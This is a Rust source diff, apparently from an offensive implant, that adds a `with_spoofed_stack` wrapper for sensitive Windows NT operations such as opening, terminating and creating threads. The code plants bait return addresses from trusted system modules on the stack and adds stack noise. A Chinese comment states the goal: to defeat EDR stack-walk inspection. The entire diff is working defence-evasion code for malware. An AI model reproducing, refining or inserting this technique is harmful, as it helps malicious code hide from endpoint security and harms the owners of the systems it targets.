@@ -170,6 +170,45 @@ where
     func(arg1, arg2)
 }
 
+/// Default wrapper for high-frequency sensitive NT ops (open/terminate/create thread).
+///
+/// - Always applies stack-walk noise.
+/// - On x64, pins legitimate bait addresses (`BaseThreadInitThunk` / `RtlUserThreadStart`)
+///   as live stack locals so walkers observe trusted modules in the frame window.
+/// - Closure runs exactly once (unlike the older asm helpers that double-invoked).
+#[inline(never)]
+pub fn with_spoofed_stack<F, R>(f: F) -> R
+where
+    F: FnOnce() -> R,
+{
+    add_stack_noise();
+
+    #[cfg(all(windows, target_arch = "x86_64"))]
+    {
+        unsafe {
+            let bait = init_bait_address();
+            // Keep bait pointers live on this stack frame for the duration of `f`.
+            let mut synthetic = [0usize; 6];
+            if bait != 0 {
+                synthetic[0] = bait;
+                synthetic[1] = bait.wrapping_add(0x14); // mid-prologue offset looks less synthetic
+                synthetic[2] = bait;
+            }
+            // Touch so LLVM cannot DCE the array while f runs.
+            let pin = core::ptr::read_volatile(&synthetic[0]);
+            let _ = pin;
+            let result = f();
+            core::ptr::read_volatile(&synthetic[0]);
+            return result;
+        }
+    }
+
+    #[cfg(not(all(windows, target_arch = "x86_64")))]
+    {
+        f()
+    }
+}
+
 /// 栈展开掩护：在执行敏感操作时，干扰 EDR 的 Stack Walk
 ///
 /// 方法：插入多层无意义的函数调用，增加栈深度，
